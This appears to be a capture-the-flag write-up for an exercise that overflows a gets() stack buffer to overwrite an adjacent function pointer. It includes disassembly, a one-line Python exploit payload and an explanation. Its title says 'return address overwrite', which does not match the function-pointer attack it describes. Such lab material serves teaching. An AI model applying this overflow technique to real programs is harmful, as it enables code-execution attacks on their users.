# ex03 - Return address overwrite

## Goal
Print `code flow successfully changed`.

## Relevant assembly (`main`)
```asm
08048438: push ebp
08048439: mov  ebp,esp
0804843b: and  esp,0xfffffff0
0804843e: sub  esp,0x60
08048441: mov  DWORD PTR [esp+0x5c],0x0      ; function pointer fp = 0
08048449: lea  eax,[esp+0x1c]                ; 64-byte buffer
0804844d: mov  DWORD PTR [esp],eax
08048450: call gets                            ; unsafe read
08048455: cmp  DWORD PTR [esp+0x5c],0x0       ; fp
0804845a: je   0x08048477
0804845c: mov  eax,0x8048560                  ; "calling function pointer, jumping to 0x%08x"
08048461: mov  edx,DWORD PTR [esp+0x5c]       ; fp
08048465: mov  DWORD PTR [esp+0x4],edx
08048469: mov  DWORD PTR [esp],eax
0804846c: call printf
08048471: mov  eax,DWORD PTR [esp+0x5c]       ; fp
08048475: call eax                            ; call fp
08048477: leave
08048478: ret
```

The `win` function is at `0x08048424`:
```asm
08048424: push ebp
08048425: mov  ebp,esp
08048427: sub  esp,0x18
0804842a: mov  DWORD PTR [esp],0x8048540       ; "code flow successfully changed"
08048431: call puts
08048436: leave
08048437: ret
```

The buffer is at `[esp+0x1c]`; `fp` is at `[esp+0x5c]`, exactly 64 bytes later.

## Relevant idea
The program reads input into a fixed-size stack buffer; an adjacent function pointer (initially 0) sits 64 bytes after it. Enough input overwrites that pointer.

## Exploit
```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x24\x84\x04\x08")' | ./bin
```

## Why it works
64 `A` bytes fill the buffer, and the next 4 bytes overwrite the function pointer `fp` with `0x08048424`, the address of the `win` function. Since `fp` is now nonzero, `main` calls it, printing the success message.
